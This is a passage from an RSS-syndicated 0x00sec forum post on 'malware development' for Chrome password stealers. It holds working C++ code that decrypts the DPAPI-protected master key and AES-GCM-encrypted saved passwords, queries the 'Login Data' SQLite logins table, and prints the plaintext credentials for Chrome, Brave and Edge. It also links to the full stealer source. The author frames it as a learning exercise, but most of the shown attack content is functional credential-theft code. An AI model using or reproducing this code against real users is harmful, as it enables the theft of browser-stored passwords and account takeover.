		std::cout &lt;&lt; "BCryptSetProperty failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Generate symmetric key
	status = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKey, NULL, 0, MasterKey.pbData, MasterKey.cbData, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BcryptGenertaeSymmetricKey failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		BCryptCloseAlgorithmProvider(hAlgorithm, 0);
		return "";
	}

	// Auth cipher mode info
	BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
	BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);
	TagOffset = TagOffset - 16;
	AuthInfo.pbNonce = IV.data();
	AuthInfo.cbNonce = IV_SIZE;
	AuthInfo.pbTag = CipherPass.data() + TagOffset;
	AuthInfo.cbTag = TAG_SIZE;

	// Get size of plaintext buffer
	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, NULL, NULL, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCryptDecrypt (1) failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Allocate memory for the plaintext
	PlainText.resize(PlainTextSize);

	status = BCryptDecrypt(hKey, CipherPass.data(), TagOffset, &amp;AuthInfo, NULL, 0, PlainText.data(), PlainTextSize, &amp;PlainTextSize, 0);
	if (!BCRYPT_SUCCESS(status))
	{
		std::cout &lt;&lt; "BCrypt Decrypt (2) failed with status: " &lt;&lt; status &lt;&lt; std::endl;
		return "";
	}

	// Close the algorithm handle
	BCryptCloseAlgorithmProvider(hAlgorithm, 0);

	return std::string(PlainText.begin(), PlainText.end());
}


</code></pre>
<p>This was a pretty complicated function to work on, mainly because Windows‚Äô BCrypt documentation was all over the place, especially once you get into authenticated encryption.</p>
<p>Before you try to understand any of it, go ahead and do a quick read on AES encryption with the GCM mode. Here‚Äôs a pretty nice <a href="https://crypto.stackexchange.com/a/18092" rel="noopener nofollow ugc">comment</a> that sums it up.</p>
<p>A quick overview of what we‚Äôre doing here:</p>
<ul>
<li>
<p>The encrypted password field contains important data we need for decryption.</p>
</li>
<li>
<p>The first is a prepended ‚Äúv10‚Äù string. I‚Äôm not really sure what it is, but it‚Äôs not important in our case, so I‚Äôm assuming it‚Äôs something that they can use as an identifier for older versions if they ever move to something different in the future.</p>
</li>
<li>
<p>The third important piece is the IV. This is a random and unique 12-byte initial vector (IV), also called a nonce.</p>
</li>
<li>
<p>Lastly, we have the authentication tag. The tag is an output of the encryption function and an input for the decryption function. It‚Äôs used to make sure the data was not tampered with.</p>
</li>
</ul>
<p>We extract the first IV with the first call to <code>copy</code>. We start added 3 because we want to skip the ‚Äúv10‚Äù prefix and copy up to IV_SIZE + 3.</p>
<p>Similarly, with the second call to <code>copy</code>, we extract ciphertext starting from 15 to the end of the string. Why 15? Because the first ‚Äúv10‚Äù string is 3 bytes plus the first IV 12 bytes equals 15.</p>
<p>After that, we make several calls to some BCrypt functions:</p>
<ul>
<li>
<p><code>BCryptOpenAlgorithmProvider</code> initializes a handle to the Windows algorithm provider.</p>
</li>
<li>
<p><code>BCryptSetProperty</code> sets the properties of the algorithm we are using, so in this case, AES with GCM mode.</p>
</li>
<li>
<p><code>BCryptGenerateSymmetricKey</code> The most important step is generating/deriving the key from the master key.</p>
</li>
<li>
<p>Initializing the AuthInfo struct with authentication data we need like IV (nonce), IV size, tag for authentication.</p>
</li>
<li>
<p>Finally, with all that, we make two <code>BCryptDecrypt</code> calls. The first is to retrieve the size, and the second is to decrypt the data and store it in our vector.</p>
</li>
</ul>
<h3>
<a name="h-4-parsing-the-database-8" class="anchor" href="https://0x00sec.org#h-4-parsing-the-database-8"></a>4. Parsing the Database</h3>
<hr>
<p>All we have to do now is retrieve the data from the SQLite database <strong>Login Data</strong> and pass in the password to the AESdecrypterFunction.</p>
<pre><code class="lang-cpp">void DecryptPasswordFor(BROWSER browser)
{
	std::string DbPath = FileIO::GetDbPath(browser);
	DATA_BLOB* MasterKey = GetMasterKey(browser);

	sqlite3* db = nullptr;
	std::string selectQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins";
	sqlite3_stmt* selectStmt = nullptr;


	// Open the database file
	if (sqlite3_open(DbPath.c_str(), &amp;db) != SQLITE_OK) {
		std::cerr &lt;&lt; "Failed to open database file: " &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}

	// Prepare the SELECT statement
	if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &amp;selectStmt, 0) != SQLITE_OK) {
		std::cerr &lt;&lt; "Failed to prepare SELECT statement: " &lt;&lt; sqlite3_errmsg(db) &lt;&lt; std::endl;
		return;
	}
	// Iterate over the rows of the logins table
	while (sqlite3_step(selectStmt) == SQLITE_ROW) {
		// Extract the values of the columns
		const char* website = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 0));
		const char* loginUrl = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 1));
		const char* userName = reinterpret_cast&lt;const char*&gt;(sqlite3_column_text(selectStmt, 2));
		const char* passwordBlob = reinterpret_cast&lt;const char*&gt;(sqlite3_column_blob(selectStmt, 3));
		int passwordBlobSize = sqlite3_column_bytes(selectStmt, 3);

		if (passwordBlobSize &gt; 0) {
			// Decrypt the password
			std::string pass = AESDecrypter(passwordBlob, *MasterKey);
			// Print the login information
			std::cout &lt;&lt; "Website: " &lt;&lt; website &lt;&lt; std::endl;
			std::cout &lt;&lt; "Login URL: " &lt;&lt; loginUrl &lt;&lt; std::endl;
			std::cout &lt;&lt; "User name: " &lt;&lt; userName &lt;&lt; std::endl;
			std::cout &lt;&lt; "Password: " &lt;&lt; pass &lt;&lt; std::endl;
		}
		else {
			// Print a message if the password is empty
			std::cout &lt;&lt; "No password found " &lt;&lt; std::endl;
		}
	}

	delete MasterKey;
}

</code></pre>
<h2>
<a name="conclusion-9" class="anchor" href="https://0x00sec.org#conclusion-9"></a>Conclusion</h2>
<p>In this post we went quickly went over the encryption and decryption process used by Chrome to store and protect sensitive user data such as passwords. The process involves generating a unique master key, which is then encrypted using the Windows Data Protection API (DPAPI) and stored in the Local State file. Sensitive data is then encrypted using the AES-GCM algorithm and stored in the Login Data SQLite file. To retrieve and decrypt the data, the master key must be retrieved and decrypted using CryptUnprotectData, and the password value must be decrypted using an AES-GCM decryption process. This process the decryption process is common amongst chromium browsers.</p>
<p>But I wouldn‚Äôt say the same for my other functions in FileIO.h lol, I did try it on 3 different browsers and it works but I believe other chromium browsers store database and local state files in different locations, so that‚Äôs something to double check on.</p>
<p>I did experiment with on 3 different browsers and it works for those.</p>
<pre><code class="lang-cpp">int main() {


	std::cout &lt;&lt; "CHROME\n\n";	
	DecryptPasswordFor(CHROME);
	std::cout &lt;&lt; "\n\nBRAVE\n\n";
	DecryptPasswordFor(BRAVE);
	std::cout &lt;&lt; "\n\nEDGE\n\n";
	DecryptPasswordFor(EDGE);
}
</code></pre>
<p>Here‚Äôs the full output</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/0/e0faf5f75cf959fcaec27a8fbfa4dcf67c4c0df2.png" data-download-href="/uploads/short-url/w6gDkJJx7zjNiaeSqaUYDtWV83w.png?dl=1" title="image" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/0/e0faf5f75cf959fcaec27a8fbfa4dcf67c4c0df2.png" alt="image" data-base62-sha1="w6gDkJJx7zjNiaeSqaUYDtWV83w" width="539" height="500" data-dominant-color="161616"></a></div><p></p>
<p>That‚Äôs all for this post, if you have any questions, clarification, or improvements please let me know below. I‚Äôm still in the learning process and would greatly appreciate the feedback.</p>
<p>Thx for reading <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
<h3>
<a name="source-code-linkhttpsgithubcomevil-acidmalware-developmenttreemainmalware101infostealers-10" class="anchor" href="https://0x00sec.org#source-code-linkhttpsgithubcomevil-acidmalware-developmenttreemainmalware101infostealers-10"></a><a href="https://github.com/EVIL-ACID/Malware-Development/tree/main/Malware101:Infostealers" rel="noopener nofollow ugc">Source code link</a>
</h3>
          <p><a href="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571/1</link>
        <pubDate>Wed, 22 Feb 2023 03:42:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-33571-1</guid>
        <source url="https://0x00sec.org/t/malware-development-1-password-stealers-chrome/33571.rss">Malware Development 1 : Password Stealers (chrome)</source>
      </item>
  </channel>
</rss>
